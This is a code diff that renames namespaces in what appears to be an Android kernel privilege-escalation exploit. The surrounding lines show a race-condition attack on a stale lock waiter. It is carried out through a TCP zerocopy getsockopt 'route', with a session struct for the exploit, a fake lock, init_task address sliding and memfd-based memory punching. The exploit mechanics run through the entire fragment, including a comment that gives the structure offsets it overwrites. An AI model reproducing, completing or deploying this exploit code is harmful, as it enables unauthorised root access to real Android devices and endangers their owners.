@@ -12,9 +12,9 @@
 #include <sys/socket.h>
 #endif
 
-using namespace ghostlock;
+using namespace lsprivilege;
 
-namespace ghostlock::route::tcp_zerocopy {
+namespace lsprivilege::route::tcp_zerocopy {
     TcpZerocopyRoute::TcpZerocopyRoute(
         race::PiRace *race_context, const memory::WriteRequest *route_request,
         const profile::TargetProfile &profile_value,
@@ -90,12 +90,12 @@ namespace ghostlock::route::tcp_zerocopy {
             status.code = ROUTE_FALLBACK_SAFE;
         }
     }
-} // namespace ghostlock::route::tcp_zerocopy
+} // namespace lsprivilege::route::tcp_zerocopy
 
 
 #if defined(__ANDROID__)
 
-namespace ghostlock::route {
+namespace lsprivilege::route {
         /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
@@ -209,9 +209,9 @@ namespace ghostlock::route {
                 context.status.step, context.status.error_number);
         return status;
     }
-} // namespace ghostlock::route
+} // namespace lsprivilege::route
 
-namespace ghostlock::route::tcp_zerocopy {
+namespace lsprivilege::route::tcp_zerocopy {
     int32_t TcpZerocopyRoute::prepare() noexcept {
         if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
             (session::g_exploit_session.
@@ -230,7 +230,7 @@ namespace ghostlock::route::tcp_zerocopy {
 
         page_size = (size_t) sysconf(_SC_PAGESIZE);
         punch_fd.reset(
-            (int32_t) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
+            (int32_t) syscall(SYS_memfd_create, "lsprivilege-tcp", MFD_CLOEXEC));
         if (!punch_fd.valid() ||
             fallocate(punch_fd.get(), 0, 0, (off_t) mapping_length) != 0) {
             pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
@@ -263,7 +263,7 @@ namespace ghostlock::route::tcp_zerocopy {
     /* Run the route after prepare has established exclusive resource ownership. */
     route::RouteStatus TcpZerocopyRoute::execute() noexcept {
         /* waiter->task carries init_task's phys alias, not the image address */
-        uintptr_t waiter_task = ghostlock::profile::slide_init_task();
+        uintptr_t waiter_task = lsprivilege::profile::slide_init_task();
         uint32_t arm_seq = profile.tcp_arm_sequence();
         uint32_t post_hold =
                 profile.tcp_post_receive_hold_iterations();
@@ -360,6 +360,6 @@ namespace ghostlock::route::tcp_zerocopy {
         }
         return status;
     }
-} // namespace ghostlock::route::tcp_zerocopy
+} // namespace lsprivilege::route::tcp_zerocopy
 #endif // __ANDROID__
 
